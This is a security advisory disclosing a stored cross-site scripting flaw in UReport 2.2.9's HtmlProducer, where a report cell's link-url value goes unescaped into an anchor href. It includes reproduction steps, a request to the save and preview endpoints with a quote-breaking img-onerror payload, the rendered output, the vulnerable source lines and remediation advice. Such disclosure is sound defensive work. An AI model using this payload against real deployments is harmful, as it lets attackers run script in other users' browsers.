# UReport link-url attribute stored XSS

## Summary

HtmlProducer concatenates the report cell link-url value into an anchor href attribute without attribute encoding or a URL-scheme allowlist.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored report.

Verified flow: `stored cell link-url -> CellParser -> HtmlProducer -> unescaped <a href> attribute`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a report cell with a quote-breaking link-url value encoded as valid XML entities.
2. Save the report and confirm persistence.
3. Preview it and inspect the anchor where the value creates a sibling IMG element.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>

file=URLENCODE×3("blade-gt48261022n2c.ureport.xml")
content=URLENCODE×2(<ureport><cell name="A1"
 link-url="x&amp;quot;&amp;gt;&amp;lt;img src=x onerror=self[`al`+`ert`](`gt48261022n2c`)&amp;gt;">
 <simple-value>CLICKME</simple-value></cell>...</ureport>)

GET <BASE_URL>/blade-report/ureport/preview?_u=blade-gt48261022n2c.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022n2a` | href breakout + raw IMG | **PASS** |
| 2 | `gt48261022n2b` | href breakout + raw IMG | **PASS** |
| 3 | `gt48261022n2c` | href breakout + raw IMG | **PASS** |

```text
Saved run-3 response:
<td class='_A1'><a href="x"><img src=x onerror=self[`al`+`ert`](`gt48261022n2c`)>" target="_self">CLICKME</a></td>
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
CellParser.java:91-100
String linkUrl = element.attributeValue("link-url");
cell.setLinkUrl(linkUrl);

HtmlProducer.java:150-200
String linkURL = cell.getLinkUrl();
sb.append("<a href=\"" + linkURL + "\" target=\"" + target + "\">");
```

Root cause: A stored report property is parsed as arbitrary text and concatenated into a quoted URL attribute without canonicalization or attribute encoding.

## Recommended remediation

Restrict schemes to a small allowlist, reject quote/control characters and attribute-encode the final canonical URL.

## References

- Official source: https://github.com/youseries/ureport/blob/master/ureport2-core/src/main/java/com/bstek/ureport/export/html/HtmlProducer.java

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-06 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-06/01-reproduction.png)

### Three-run success proof

![CAN-06 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-06/02-success-proof.png)

### Source-to-Sink evidence

![CAN-06 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-06/03-source-sink.png)
